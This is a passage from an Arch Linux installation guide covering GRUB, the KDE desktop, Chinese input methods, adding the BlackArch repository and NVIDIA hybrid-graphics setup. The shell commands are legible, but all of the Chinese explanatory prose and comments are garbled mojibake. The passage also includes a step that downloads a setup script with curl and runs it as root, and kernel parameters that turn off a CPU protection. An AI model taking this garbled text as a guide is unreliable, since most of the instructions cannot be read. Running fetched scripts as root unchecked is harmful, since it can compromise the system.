è¾“å…¥ä¸»æœºåå³å¯</span><br><span class="line">vim /etc/hosts #é…ç½®æœ¬åœ°hostså¦‚ä¸‹</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1   localhost</span><br><span class="line">::1         localhost</span><br><span class="line">127.0.1.1   myarch.localdomain myarch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime # æ—¶åŒº</span><br><span class="line">hwclock --systohc # ç¡¬ä»¶åŒæ­¥æ—¶é—´</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/locale.gen # å»æ‰enUSå’ŒzhCN ä¸¤ä¸ªutf8çš„æ³¨é‡Š</span><br><span class="line">locale-gen</span><br><span class="line">echo &#x27;LANG=en_US.UTF-8&#x27;  &gt; /etc/locale.conf</span><br><span class="line"></span><br><span class="line">passwd root</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pacman -S intel-ucode <span class="comment"># Intel å¾®ç </span></span><br><span class="line">pacman -S amd-ucode <span class="comment"># AMD</span></span><br></pre></td></tr></table></figure><h3 id="grubå¼•å¯¼">grubå¼•å¯¼</h3><p>å»ºè®®é…ç½®ï¼Œgrubå¼•å¯¼æ¯”æ²¡æœ‰å¼ºï¼Œä½œè€…ä¹‹å‰ä¸ç”¨ï¼Œuç›˜ç›´æ’å¯åŠ¨ï¼Œå†…æ ¸å‚æ•°ç›¸å…³çš„é…ç½®ç¨å¾®ç¹çä¸€ç‚¹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pacman -S grub efibootmgr os-prober</span><br><span class="line">grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=ARCH</span><br><span class="line">vim /etc/default/grub</span><br></pre></td></tr></table></figure><p>é…ç½®grubå‚æ•°éœ€è¦ï¼š</p><ul class="lvl-0"><li class="lvl-2"><p>GRUB_CMDLINE_LINUX_DEFAULTå†…æ ¸å‚æ•°å»æ‰quietï¼Œloglevel=5æ–¹ä¾¿è§‚å¯Ÿ</p></li><li class="lvl-2"><p>åŠ å…¥nowatchdogï¼ˆå‚è€ƒ<a href="https://arch.icekylin.online/guide/rookie/basic-install.html#_17-%E5%AE%89%E8%A3%85%E5%BC%95%E5%AF%BC%E7%A8%8B%E5%BA%8F">è¿™é‡Œ</a>ï¼‰</p></li><li class="lvl-2"><p>å¦‚æœè¦é…ç½®nå¡é©±åŠ¨æ€•ç­‰ä¸‹é‡åˆ°é—®é¢˜ï¼Œå¯ä»¥æå‰åŠ å…¥ibt=offç­‰</p></li><li class="lvl-2"><p>å–æ¶ˆæœ€åä¸€è¡Œçš„GRUB_DISABLE_OS_PROBER=falseæ³¨é‡Šï¼Œå¦‚æœè¦å¼•å¯¼winçš„è¯</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br><span class="line"></span><br><span class="line">exit # é€€å›å®‰è£…ç¯å¢ƒ</span><br><span class="line">umount -R /mnt # å¸è½½æ–°åˆ†åŒº</span><br><span class="line">reboot # é‡å¯</span><br></pre></td></tr></table></figure><h3 id="é‡å¯å">é‡å¯å</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable --now NetworkManager</span><br><span class="line"># æ— çº¿ï¼š</span><br><span class="line">nmcli dev wifi list # æ˜¾ç¤ºé™„è¿‘çš„ Wi-Fi ç½‘ç»œ</span><br><span class="line">nmcli dev wifi connect &quot;Wi-Fiåï¼ˆSSIDï¼‰&quot; password &quot;ç½‘ç»œå¯†ç &quot; # è¿æ¥æŒ‡å®šçš„æ— çº¿ç½‘ç»œ</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bash_profile #æ·»åŠ  export EDITOR=&#x27;vim&#x27;</span><br><span class="line">useradd -m -G wheel -s /bin/bash myusername</span><br><span class="line">passwd myusername</span><br><span class="line">EDITOR=vim visudo # è¿™é‡Œéœ€è¦æ˜¾å¼çš„æŒ‡å®šç¼–è¾‘å™¨ï¼Œå› ä¸ºä¸Šé¢çš„ç¯å¢ƒå˜é‡è¿˜æœªç”Ÿæ•ˆ</span><br><span class="line"># å–æ¶ˆæ³¨é‡Šè¿™ä¸€è¡Œï¼š </span><br><span class="line">#%wheel ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure><p>å¼€å¯pacman32ä½å’Œarchlinuxcnï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/pacman.conf</span><br><span class="line"># å»æ‰multilibæ³¨é‡Š</span><br><span class="line"># æ·»åŠ ï¼ˆé€‰ä¸€ä¸ªä¹Ÿè¡Œï¼‰ï¼š</span><br><span class="line">[archlinuxcn]</span><br><span class="line">Server = https://mirrors.hust.edu.cn/archlinuxcn/$arch</span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinuxcn/$arch # ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦å¼€æºé•œåƒç«™</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch # æ¸…åå¤§å­¦å¼€æºè½¯ä»¶é•œåƒç«™</span><br><span class="line">Server = https://mirrors.hit.edu.cn/archlinuxcn/$arch # å“ˆå°”æ»¨å·¥ä¸šå¤§å­¦å¼€æºé•œåƒç«™</span><br><span class="line">Server = https://repo.huaweicloud.com/archlinuxcn/$arch # åä¸ºå¼€æºé•œåƒç«™</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -Syyu</span><br></pre></td></tr></table></figure><h1>æ›´ç»†èŠ‚çš„è®¾ç½®å‘½ä»¤</h1><h2 id="å®‰è£…æ¡Œé¢å’Œå¿…å¤‡å…¶ä»–ç»„ä»¶">å®‰è£…æ¡Œé¢å’Œå¿…å¤‡å…¶ä»–ç»„ä»¶</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pacman -S plasma-meta konsole dolphin # plasma-meta å…ƒè½¯ä»¶åŒ…ã€konsole ç»ˆç«¯æ¨¡æ‹Ÿå™¨å’Œ dolphin æ–‡ä»¶ç®¡ç†å™¨</span><br><span class="line">pacman -S  plasma-workspace xdg-desktop-portal egl-wayland</span><br><span class="line"># Nå¡ç”¨æˆ·éœ€è¦é¢å¤–å®‰è£…egl-wayland,xdg-desktop-portalåŒ…æ˜¯ä¸ºäº†å¦‚obsæ­¤ç±»å·¥å…·å½•åˆ¶å±å¹•ä½¿ç”¨</span><br><span class="line"># xdg-desktop-portalåŒ…ç»„æä¾›äº†ä¸åŒç¯å¢ƒä¸‹ä½¿ç”¨çš„è½¯ä»¶åŒ…</span><br><span class="line"># ä¾‹å¦‚kdeç”¨æˆ·å¯é€‰æ‹©xdg-desktop-portal-kdeåŒ…</span><br><span class="line">systemctl enable sddm</span><br><span class="line">systemctl start sddm  # æˆ–è€…é‡å¯reboot</span><br><span class="line"># nå¡æ¨èx11å¯åŠ¨</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S sof-firmware alsa-firmware alsa-ucm-conf # å£°éŸ³å›ºä»¶</span><br><span class="line">sudo pacman -S ntfs-3g # ä½¿ç³»ç»Ÿå¯ä»¥è¯†åˆ« NTFS æ ¼å¼çš„ç¡¬ç›˜ï¼ŒåŒç³»ç»Ÿå¿…è£…ï¼Œwinæ˜¯ntfs</span><br><span class="line">sudo pacman -S adobe-source-han-serif-cn-fonts wqy-zenhei # å®‰è£…å‡ ä¸ªå¼€æºä¸­æ–‡å­—ä½“ã€‚ä¸€èˆ¬è£…ä¸Šæ–‡æ³‰é©¿å°±èƒ½è§£å†³å¤§å¤š wine åº”ç”¨ä¸­æ–‡æ–¹å—çš„é—®é¢˜</span><br><span class="line">sudo pacman -S noto-fonts noto-fonts-cjk noto-fonts-emoji noto-fonts-extra # å®‰è£…è°·æ­Œå¼€æºå­—ä½“åŠè¡¨æƒ…</span><br><span class="line">sudo pacman -S ark # å‹ç¼©è½¯ä»¶ã€‚åœ¨ dolphin ä¸­å¯ç”¨å³é”®è§£å‹å‹ç¼©åŒ…</span><br><span class="line">sudo pacman -S gwenview # å›¾ç‰‡æŸ¥çœ‹å™¨</span><br><span class="line">sudo pacman -S archlinuxcn-keyring # cn æºä¸­çš„ç­¾åï¼ˆarchlinuxcn-keyring åœ¨ archlinuxcnï¼‰</span><br><span class="line">sudo pacman -S yay # yay å‘½ä»¤å¯ä»¥è®©ç”¨æˆ·å®‰è£… AUR ä¸­çš„è½¯ä»¶ï¼ˆyay åœ¨ archlinuxcnï¼‰</span><br></pre></td></tr></table></figure><h2 id="è¾“å…¥æ³•">è¾“å…¥æ³•</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S fcitx5-im # è¾“å…¥æ³•åŸºç¡€åŒ…ç»„</span><br><span class="line">sudo pacman -S fcitx5-chinese-addons # å®˜æ–¹ä¸­æ–‡è¾“å…¥å¼•æ“</span><br><span class="line">sudo pacman -S fcitx5-anthy # æ—¥æ–‡è¾“å…¥å¼•æ“</span><br><span class="line">sudo pacman -S fcitx5-pinyin-moegirl # èŒå¨˜ç™¾ç§‘è¯åº“ã€‚äºŒåˆºçŒ¿å¿…å¤‡ï¼ˆarchlinuxcnï¼‰</span><br><span class="line">sudo pacman -S fcitx5-material-color # è¾“å…¥æ³•ä¸»é¢˜</span><br></pre></td></tr></table></figure><p>ç¼–è¾‘<code>~/.config/environment.d/im.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># fix fcitx problem</span><br><span class="line">GTK_IM_MODULE=fcitx</span><br><span class="line">QT_IM_MODULE=fcitx</span><br><span class="line">XMODIFIERS=@im=fcitx</span><br><span class="line">SDL_IM_MODULE=fcitx</span><br><span class="line">GLFW_IM_MODULE=ibus</span><br></pre></td></tr></table></figure><p>æ›´è¿›ä¸€æ­¥çš„é…ç½®/æ›´å¥½ç”¨çš„è¾“å…¥æ³•å‚è§<a href="https://arch.icekylin.online/guide/advanced/optional-cfg-1#%F0%9F%8D%80%EF%B8%8F-%E8%BE%93%E5%85%A5%E6%B3%95">å¯é€‰é…ç½®</a></p><h2 id="timeshift">timeshift</h2><p>pacmanå°±è¡Œï¼Œå‚è€ƒ<a href="https://arch.icekylin.online/guide/rookie/desktop-env-and-app.html">åº”ç”¨å®‰è£…</a></p><h2 id="blackArch">blackArch</h2><p><a href="https://www.blackarch.org/downloads.html">å®˜ç½‘</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Run https://blackarch.org/strap.sh as root and follow the instructions.</span><br><span class="line"></span><br><span class="line">$ curl -O https://blackarch.org/strap.sh</span><br><span class="line"># Verify the SHA1 sum</span><br><span class="line"></span><br><span class="line">$ echo bbf0a0b838aed0ec05fff2d375dd17591cbdf8aa strap.sh | sha1sum -c</span><br><span class="line"># Set execute bit</span><br><span class="line"></span><br><span class="line">$ chmod +x strap.sh</span><br><span class="line"># Run strap.sh</span><br><span class="line"></span><br><span class="line">$ sudo ./strap.sh</span><br><span class="line"># Enable multilib following https://wiki.archlinux.org/index.php/Official_repositories#Enabling_multilib and run:</span><br><span class="line"></span><br><span class="line">$ sudo pacman -Syu</span><br></pre></td></tr></table></figure><h1>æ˜¾å¡é©±åŠ¨</h1><p>è¿™é‡Œçš„æ‰€æœ‰å†…å®¹åªé€‚ç”¨äºiu+nå¡ï¼Œå…¶ä»–è¯·å‚è€ƒarchwikiæˆ–archlinuxç®€æ˜æ•™ç¨‹å¯¹åº”çš„éƒ¨åˆ†ã€‚å¦‚æœä½ ä¹Ÿæ˜¯åŒæ ·é…ç½®å¹¶ä¸”éœ€è¦ç¬”è®°æœ¬åŒæ˜¾å¡ï¼Œä¸‹é¢çš„å†…å®¹å¯èƒ½ä¼šå¾ˆç®¡ç”¨ã€‚ä¸ªäººç¬”è®°æœ¬æ˜¯y9000x 2022ç‰ˆæœ¬ã€‚</p><blockquote><p>è¿™ä¸ä¸€å®šé€‚ç”¨äºä½ çš„ç¬”è®°æœ¬å’Œæ˜¾å¡ï¼</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">                  -`                    zjw1nd@MATRIX-02-B </span><br><span class="line">                 .o+`                   ------------------ </span><br><span class="line">                `ooo/                   OS: Arch Linux x86_64 </span><br><span class="line">               `+oooo:                  Host: 82TF Legion Y9000X IAH7 </span><br><span class="line">              `+oooooo:                 Kernel: 6.13.4-arch1-1 </span><br><span class="line">              -+oooooo+:                Uptime: 3 hours, 2 mins </span><br><span class="line">            `/:-:++oooo+:               Packages: 1033 (pacman) </span><br><span class="line">           `/++++/+++++++:              Shell: zsh 5.9 </span><br><span class="line">          `/++++++++++++++:             Resolution: 2560x1440 </span><br><span class="line">         `/+++ooooooooooooo/`           DE: Plasma 6.3.1 </span><br><span class="line">        ./ooosssso++osssssso+`          WM: KWin </span><br><span class="line">       .oossssso-````/ossssss+`         Theme: Breeze-Dark [GTK2], Breeze [GTK3] </span><br><span class="line">      -osssssso.      :ssssssso.        Icons: breeze-dark [GTK2/3] </span><br><span class="line">     :osssssss/        osssso+++.       Terminal: konsole </span><br><span class="line">    /ossssssss/        +ssssooo/-       Terminal Font: FiraCode Nerd Font 10 </span><br><span class="line">  `/ossssso+/:-        -:/+osssso+-     CPU: 12th Gen Intel i7-12700H (20) @ 4.600GHz </span><br><span class="line"> `+sso+:-`                 `.-/+oso:    GPU: Intel Alder Lake-P GT2 [Iris Xe Graphics] </span><br><span class="line">`++:.                           `-/+/   GPU: NVIDIA GeForce RTX 3060 Mobile / Max-Q </span><br><span class="line">.`                                 `/   Memory: 6705MiB / 39850MiB</span><br></pre></td></tr></table></figure><h2 id="é¦–å…ˆï¼Œå®‰è£…æ ¸æ˜¾å’Œnå¡çš„é©±åŠ¨">é¦–å…ˆï¼Œå®‰è£…æ ¸æ˜¾å’Œnå¡çš„é©±åŠ¨</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S mesa lib32-mesa vulkan-intel lib32-vulkan-intel</span><br></pre></td></tr></table></figure><p><font color=red>âš ï¸å†æ¬¡å¼ºè°ƒï¼Œè‹±ä¼Ÿè¾¾çš„é—­æºé©±åŠ¨æ˜¯å’Œå†…æ ¸ç‰ˆæœ¬å¼ºç»‘å®šçš„ï¼Œè¯·ä¸€å®šåœ¨å®‰è£…nå¡é©±åŠ¨å‰æ‰§è¡Œpacman Syuæ“ä½œï¼å¦åˆ™ä¼šå‡ºç°å¾ˆå¤šæ„æƒ³ä¸åˆ°çš„é—®é¢˜</font></p><p><strong>å¦‚æœä½ ä¸ç¡®å®šï¼Œåˆ™å…ˆä¸è¦æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤</strong>ï¼Œå…ˆå‘åçœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S nvidia-open nvidia-settings lib32-nvidia-utils # å¿…é¡»å®‰è£…</span><br><span class="line">nvidia-smi #æ£€æŸ¥ï¼Œè¾“å‡ºåœ¨gpuä¸Šå·¥ä½œçš„è¿›ç¨‹</span><br><span class="line">lspci | grep -i vga #æ£€æŸ¥ï¼Œçœ‹ä½ çš„æ˜¾å¡é©±åŠ¨ï¼Œè¿™ä¸ªå¯ä»¥æ‰§è¡Œ</span><br></pre></td></tr></table></figure><p>å®‰è£…åï¼Œå…ˆå°†kmsä»<code>/etc/mkinitcpio.conf</code>é‡Œçš„HOOKSç§»é™¤å¹¶é‡æ–°ç”Ÿæˆinitramfs,å³<code>mkinitcpio -P</code>ã€‚è¿™æ ·å¯ä»¥é¿å…initramfsåŒ…å«nouveauã€‚æˆ‘ä¸ªäººçš„ç¯å¢ƒé‡è£…åæ‰§è¡Œåˆ°è¿™é‡Œå°±å¯ä»¥äº†ã€‚</p><p>3060 mobileæ˜¯ä¸€ä¸ªå¾ˆå°¬çš„ç‰ˆæœ¬ã€‚æˆ‘ä¸ªäººåœ¨æ›´æ–°å†…æ ¸åç›´æ¥å®‰è£…äº†nvidia-openåŒ…å°±æ²¡é—®é¢˜äº†ï¼Œä½†æ˜¯è¿‡ç¨‹ä¸­è¸©äº†ä¸€ä¸‡ä¸ªå‘ï¼Œç°åœ¨ï¼Œä¸‹é¢æ˜¯ä¸€äº›å¤‡é€‰çš„è§£å†³æ–¹æ³•ï¼Œæˆ‘ä¸ç¡®å®šå“ªäº›æœ‰ç”¨ä½†æä¾›åœ¨è¿™é‡Œã€‚åŒæ—¶å»ºè®®nå¡ä½¿ç”¨xorgæ˜¾ç¤ºæœåŠ¡å™¨ï¼Œnå¡å¯¹waylandçš„æ”¯æŒå¹¶ä¸ç®—å¥½ï¼Œwaylandä¸»è¦æ˜¯æµç•…åŠ¨ç”»å’Œhdrï¼Œå¦‚æœéœ€è¦waylandåˆ™ç»§ç»­å‘åçœ‹ã€‚</p><ul class="lvl-0"><li class="lvl-2"><p>æ— è®ºæ€ä¹ˆè£…nvidia-smiéƒ½æ˜¾ç¤ºè¿æ¥ä¸åˆ°é©±åŠ¨â€”â€”å¾ˆå¯èƒ½æ˜¯ä¸Šé¢è¯´çš„å†…æ ¸ç‰ˆæœ¬çš„é—®é¢˜</p></li><li class="lvl-2"><p>æ·»åŠ å†…æ ¸å‚æ•°<code>ibt=off</code>ï¼Œå¦‚æœä½ ä½¿ç”¨äº†grubï¼Œåˆ™ç¼–è¾‘<code>/etc/default/grub</code>ä¸­çš„å†…æ ¸å‚æ•°<code>CMDLINE_DEFAULT</code>.å¦‚æœæ²¡æœ‰ï¼Œåˆ™å‚è€ƒarchlinux wikiä¸Šçš„<a href="https://wiki.archlinuxcn.org/wiki/%E5%86%85%E6%A0%B8%E5%8F%82%E6%95%B0">å†…æ ¸å‚æ•°</a>é¡µé¢è¿›è¡Œé…ç½®ï¼Œæœ‰å¾ˆå¤šåŠæ³•ã€‚è¿™æ˜¯intelçš„ä¸€ä¸ªé—´æ¥è·³è½¬æ§åˆ¶æµä¿æŠ¤æœºåˆ¶ï¼Œç®€å•æ¥è¯´å°±æ˜¯åªå…è®¸<code>jmp rax</code>è¿™æ ·çš„æŒ‡ä»¤åœ¨æ ¸æ€è·³åˆ°æ ‡è®°è¿‡çš„ä½ç½®ã€‚</p></li><li class="lvl-2"><p>å®‰è£…åå‘ç°nå¡é©±åŠ¨è¿˜æ˜¯å¼€æºé©±åŠ¨nouveauâ€”â€”archè‡ªå¸¦äº†å¼€æºé©±åŠ¨nouveauï¼Œæ‰èƒ½ç‚¹äº®æ¡Œé¢çš„ã€‚nå¡åº”è¯¥é»˜è®¤ä¼šå±è”½nouveauï¼Œå¦‚æœæ²¡æœ‰å¯ä»¥å¸è½½nouveauï¼Œå¹¶åœ¨å†…æ ¸å‚æ•°ä¸­æ·»åŠ é»‘åå•ç¦æ­¢nouveauçš„åŠ è½½ã€‚å†…æ ¸å¯åŠ¨å‚æ•°æ·»åŠ <code>module_blacklist=nouveau</code>ç„¶åæ›´æ–°grubã€‚æˆ–åœ¨<code>/etc/modprobe.d</code>ä¸­åˆ›å»ºä¸€ä¸ª<code>blacklist.conf</code>ï¼Œæ·»åŠ </p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">blacklist nouveau</span><br><span class="line">options nouveau modeset=0</span><br></pre></td></tr></table></figure><p>åŒç†ï¼Œç±»ä¼¼çš„æ€æƒ³å¯ä»¥ç”¨äºå¾ˆå¤šåœ°æ–¹ï¼Œä¹Ÿå¯ä»¥åå‘è®©nouveauå¼€å¯ã€‚</p><ul class="lvl-0"><li class="lvl-2"><p>å¦‚æœä½ ä¸æ˜¯ç”¨çš„â€œlinuxâ€å†…æ ¸ï¼Œè€Œæ˜¯linux-zenæˆ–è€…linux-ltsï¼Œåˆ™å®‰è£…å¯¹åº”é©±åŠ¨ï¼Œå°†nvidia-openæ›¿æ¢ä¸º<code>nvidia-open-lts,nvida-open-zenæˆ–nvidia-open-dkms</code>ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒdkmsåŒ…æ˜¯ä¸€ä¸ªä¸å’Œå†…æ ¸ç»‘å®šçš„é©±åŠ¨ï¼Œåœ¨å…¶ä»–é©±åŠ¨é‡åˆ°é—®é¢˜ä¹‹åä¹Ÿå¯ä»¥å†æ¥å°è¯•è¿™ä¸ªé©±åŠ¨ã€‚dkmséœ€è¦å†…æ ¸å¯¹åº”çš„linuxheaderï¼Œä¸€èˆ¬ä¼šä½œä¸ºä¾èµ–ä¸€èµ·å®‰è£…ã€‚</p></li><li class="lvl-2"><p>å¦‚æœä½ éœ€è¦Waylandï¼Œè¿˜éœ€è¦å¯ç”¨ä¸¤ä¸ªnvidia_drmçš„ä¸¤ä¸ªå†…æ ¸å‚æ•°ï¼šmodesetå’Œfbdevï¼ŒäºŒè€…åœ¨æ–°çš„nvidiaé©±åŠ¨åŒ…ä¸­è¢«é»˜è®¤å¯ç”¨ï¼Œä½†è¿˜æ˜¯å»ºè®®è‡ªå·±åœ¨å†…æ ¸å‚æ•°æ·»åŠ ä¸€ä¸‹ã€‚</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/module/nvidia_drm/parameters/fbdev # æ£€æŸ¥ï¼Œå¤±è´¥è¿”å›ç¼ºå°‘æ–‡ä»¶</span><br><span class="line">cat /sys/module/nvidia_drm/parameters/modeset # æ­£ç¡®è¿”å›Y</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šéƒ½æ²¡èƒ½è§£å†³çš„è¯ï¼Œæ›´å¤šçš„å†…å®¹ï¼Œå¯ä»¥å‚è€ƒarchlinuxwikiä¸Šçš„<a href="https://wiki.archlinuxcn.org/wiki/NVIDIA">NVIDIA</a>å’Œ<a href="https://wiki.archlinuxcn.org/wiki/NVIDIA/%E6%95%85%E9%9A%9C%E6%8E%92%E9%99%A4">NVIDIA/æ•…éšœæ’é”™</a></p><h2 id="åŒæ˜¾å¡é…ç½®">åŒæ˜¾å¡é…ç½®</h2><p>æˆ‘ä¸ªäººä½¿ç”¨äº†optimus-managerï¼Œæ‰€ä»¥æ¨èè¿™ä¸ªã€‚envycontrolæŠŠæˆ‘ç”µè„‘æ•´å´©æºƒäº†æ‰€ä»¥ä¸ªäººä¸æ¨èï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥è¯•è¯•ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yay -S optimus-manager optimus-manager-qt</span><br><span class="line">sudo systemctl enable optimus-manager.service</span><br></pre></td></tr></table></figure><p>è¿™æ—¶é‡å¯åº”è¯¥å°±èƒ½ä½¿ç”¨optimus-manageräº†ã€‚<br><font color=lightyellow>âš ï¸æ³¨æ„ï¼Œå¦‚æœä½ å¯¹ä½ çš„ç¯å¢ƒæ²¡æœ‰è‡ªä¿¡ï¼ˆæ¯”å¦‚æˆ‘ï¼‰ï¼Œä¸€å®šè¦åœ¨æ¯æ¬¡åˆ‡æ¢æ˜¾å¡å®Œåæ‰‹åŠ¨æ³¨é”€ä¸€æ¬¡è§‚å¯Ÿæ˜¯å¦æ­£å¸¸å†å…³æœºï¼Œä¸è¦åˆ‡æ¢åç›´æ¥å…³æœºï¼Œå¦åˆ™å¯èƒ½ä¼šè«åå…¶å¦™çš„é»‘å±</font>æ›´å¤šçš„ä¸æ¸¸æˆè¿è¡Œï¼ŒåŒæ˜¾å¡åŠ¨æ€å·¥ä½œåˆ‡æ¢ç›¸å…³çš„å¯ä»¥å‚è€ƒ<a href="https://arch.icekylin.online/guide/rookie/graphic-driver.html">ç®€æ˜æŒ‡å—</a></p><p>ç„¶åæ˜¯ç”µæºç­–ç•¥ï¼Œå¯¹äºåŒæ˜¾å¡ï¼Œå¦‚æœä¸åšæ‰‹åŠ¨ç”µæºç­–ç•¥é…ç½®ï¼Œä¸€èˆ¬æ¥è¯´å°±ç®—åˆ‡æ¢åˆ°é›†æ˜¾æ¨¡å¼ï¼Œæ²¡æœ‰biosç¦ç”¨ç‹¬æ˜¾çš„è¯ï¼Œå®ƒä¹Ÿä¼šä¸€ç›´å·¥ä½œè€—ç”µï¼Œå¾ˆsbã€‚å› æ­¤éœ€è¦æˆ‘ä»¬é…ç½®optimusçš„ç”µæºç­–ç•¥ã€‚æˆ‘ä¸ªäººå°è¯•è¿‡çš„æœ‰ä¸¤ç§ï¼Œbbswitchç­–ç•¥åœ¨åˆ‡æ¢é›†æ˜¾å…³æœºåå†å¼€tty2å°±é»‘å±äº†ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆä¿®ï¼Œtty3èƒ½ç”¨ï¼Œåæ­£åˆšè£…å¥½æ²¡å¤šä¹…å°±é‡è£…äº†ã€‚</p><blockquote><p>é‡è£…æ˜¯è§£å†³archå¾ˆå¤šé—®é¢˜æœ€å¿«çš„æ–¹æ¡ˆï¼ˆï¼‰</p></blockquote><p>å¯¹äºç”µæºç­–ç•¥ï¼Œè¯·å‚è€ƒoptimus-managerçš„<a href="https://github.com/Askannz/optimus-manager/wiki/A-guide--to-power-management-options">å®˜æ–¹æ–‡æ¡£</a>ï¼Œå¹¶ä¸”ä¸€å®šè¦<strong>çœ‹å®Œ</strong>ã€‚æˆ‘é‡‡ç”¨çš„ç­–ç•¥å°±æ˜¯ç¬¬ä¸€æ¡ï¼Œé¦–å…ˆå°†optimus-managerçš„ç”µæºç­–ç•¥è®¾ç½®ä¸ºcustom,ç„¶åæ‰¾åˆ°å®ƒçš„é…ç½®æ–‡ä»¶<code>/etc/optimus-manager/optimus-manager.conf</code>ï¼Œå°†nvidiaä¸‹çš„å‚æ•°è®¾ç½®è¿™ä¸€æ¡<code>dynamic_power_management=fine</code>å³å¯ã€‚è¿™æ—¶ï¼Œnå¡è‡ªå¸¦çš„ç”µæºç­–ç•¥ä¼šæ ¹æ®å…¶å‚æ•°è®¾ç½®ï¼ˆfine: çŸ­æ—¶é—´æ²¡æœ‰è¿›ç¨‹å‘gpuæäº¤ä½œä¸šåè¿›å…¥ä½åŠŸè€—ï¼›coarse: æ²¡æœ‰åº”ç”¨ä½¿ç”¨nå¡é©±åŠ¨åè¿›å…¥ä½åŠŸè€—ï¼Œå‚è€ƒ<a 